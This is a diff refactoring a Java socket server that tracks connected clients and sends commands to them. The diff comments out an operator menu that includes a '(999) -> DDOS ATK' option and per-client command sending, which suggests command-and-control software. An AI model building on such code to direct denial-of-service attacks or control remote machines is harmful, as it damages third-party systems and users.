@@ -1,29 +1,24 @@
-package br.com.pricher.server;
+package br.com.pricher.server.core;
 
 import br.com.pricher.server.model.User;
+import br.com.pricher.server.view.NotificationManager;
 
-import java.awt.*;
 import java.io.*;
-import java.net.MalformedURLException;
 import java.net.ServerSocket;
 import java.net.Socket;
-import java.util.ArrayList;
 import java.util.HashMap;
-import java.util.Scanner;
 
 /**
  * Created by Jeferson Machado on 26/07/2017.
  */
 public class Server extends Thread {
-    private static int userGeneratedId = 0;
-    private static final int LOW = 1;
-    private static final int MEDIUM = 2;
-    private static final int HIGH = 3;
+
+    private static int mUserGeneratedId = 0;
 
     private static OnServerCallback mCallback;
 
-    private static ArrayList<BufferedWriter> clients;
-    private static HashMap<BufferedWriter, String> clientsNames;
+    private static HashMap<BufferedWriter, User> mClients;
+
     private Socket con;
     private BufferedReader bfr;
 
@@ -40,46 +35,50 @@ public class Server extends Thread {
 
     public static void Start(OnServerCallback callback, int port) {
         mCallback = callback;
-
+        mClients = new HashMap<>();
         try {
-            final ServerSocket server = new ServerSocket(port);
+            ServerSocket server = new ServerSocket(port);
 
             new Thread(() -> {
                 while (true) {
-                    //System.out.println("Waiting connection...");
-                    Socket con = null;
                     try {
-                        con = server.accept();
+                        Socket con = server.accept();
+                        Thread t = new Server(con);
+                        t.start();
                     } catch (IOException e) {
                         e.printStackTrace();
                     }
-                    //System.out.println("Client connected...");
-                    Thread t = new Server(con);
-                    t.start();
                 }
             }).start();
 
         } catch (Exception ignored) {
             callback.onServerDisconnect();
         }
-
     }
 
-    private static void sendToAll(String msg) throws IOException {
-        for (BufferedWriter bw : clients) {
-            bw.write(msg + "\r\n");
-            bw.flush();
+    private static void sendToAll(String msg) {
+        mClients.forEach((bw, user) -> {
+            try {
+                bw.write(msg + "\r\n");
+                bw.flush();
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+        });
+    }
+
+    private static void sendMsgToClient(BufferedWriter bf, String message) {
+        if (mClients.containsKey(bf)) {
+            try {
+                bf.write(message + "\r\n");
+                bf.flush();
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
         }
     }
 
-    private static void sendMsgToClient(BufferedWriter bf, String message) throws IOException {
-        if (clients.contains(bf)) {
-            bf.write(message + "\r\n");
-            bf.flush();
-        }
-    }
-
-    private static void showOptions() {
+    /*private static void showOptions() {
         try {
             do {
                 int clientSelected;
@@ -87,11 +86,11 @@ public class Server extends Thread {
 
                 System.out.println("-----------------------------------------");
 
-                if (clients.size() > 0) {
+                if (mClients.size() > 0) {
                     Scanner reader = new Scanner(System.in);
 
-                    for (int i = 0; i < clients.size(); i++) {
-                        System.out.println("(" + i + ") -> ClientName: " + clientsNames.get(clients.get(i)));
+                    for (int i = 0; i < mClients.size(); i++) {
+                        System.out.println("(" + i + ") -> ClientName: " + mClientsNames.get(mClients.get(i)));
                     }
 
                     System.out.println("(999) -> DDOS ATK");
@@ -101,12 +100,12 @@ public class Server extends Thread {
                     do {
                         System.out.print("Select a client: >. ");
                         clientSelected = reader.nextInt();
-                        if ((clientSelected > clients.size() - 1 || clientSelected < 0) && clientSelected != 666 && clientSelected != 999) {
+                        if ((clientSelected > mClients.size() - 1 || clientSelected < 0) && clientSelected != 666 && clientSelected != 999) {
                             System.out.println("Select a valid client");
                             System.out.println("-----------------------------------------");
                         }
                     }
-                    while ((clientSelected > clients.size() - 1 || clientSelected < 0) && clientSelected != 666 && clientSelected != 999);
+                    while ((clientSelected > mClients.size() - 1 || clientSelected < 0) && clientSelected != 666 && clientSelected != 999);
 
                     if (clientSelected == 666) {
                         System.out.println("-----------------------------------------");
@@ -187,10 +186,10 @@ public class Server extends Thread {
                     }
 
                     try {
-                        sendMsgToClient(clients.get(clientSelected), msg);
+                        sendMsgToClient(mClients.get(clientSelected), msg);
                         System.out.println("Command send!");
                     } catch (Exception ignored) {
-                        removeUser(clients.get(clientSelected));
+                        removeUser(mClients.get(clientSelected));
                     }
 
 
@@ -216,27 +215,14 @@ public class Server extends Thread {
             } while (true);
         } catch (Exception ignored) {
         }
-    }
+    }*/
 
     private static void removeUser(BufferedWriter bufferedWriter) {
         try {
-            showNotification(clientsNames.get(bufferedWriter) + " disconnected :C");
-            clientsNames.remove(bufferedWriter);
-            clients.remove(bufferedWriter);
-
+            NotificationManager.show(mClients.get(bufferedWriter) + " disconnected :C");
+            User removed = mClients.remove(bufferedWriter);
+            mCallback.onUserDisconnected(removed.getId());
         } catch (Exception ignored) {
-        }
-    }
-
-    private static void showNotification(String message) {
-        if (SystemTray.isSupported()) {
-            try {
-                new TrayIcon().displayTray(message);
-            } catch (AWTException | MalformedURLException e) {
-                e.printStackTrace();
-            }
-        } else {
-            System.err.println("System tray not supported!");
         }
     }
 
@@ -244,28 +230,24 @@ public class Server extends Thread {
         try {
             OutputStream outPutStream = this.con.getOutputStream();
             Writer writer = new OutputStreamWriter(outPutStream);
-            final BufferedWriter bufferedWriter = new BufferedWriter(writer);
-            clients.add(bufferedWriter);
+            BufferedWriter bufferedWriter = new BufferedWriter(writer);
 
             String content = bfr.readLine();
-            User user = User.create(content, ++userGeneratedId);
+            User user = User.create(content, mUserGeneratedId++);
             mCallback.onUserConnected(user);
-            clientsNames.put(bufferedWriter, name);
+            mClients.put(bufferedWriter, user);
 
-            showNotification(name + " connected :D");
-
-            //if (clients.size() <= 1) showOptions();
-            final BufferedReader gambi = bfr;
+            NotificationManager.show(user + " -> connected :D");
 
             new Thread(() -> {
                 while (true) {
                     try {
-                        String msgg = gambi.readLine();
-                        if (msgg == null) {
+                        String messageContent = bfr.readLine();
+                        if (messageContent == null) {
                             removeUser(bufferedWriter);
                             break;
                         } else {
-                            showNotification(msgg);
+                            NotificationManager.show(messageContent);
                         }
                     } catch (IOException e) {
                         removeUser(bufferedWriter);
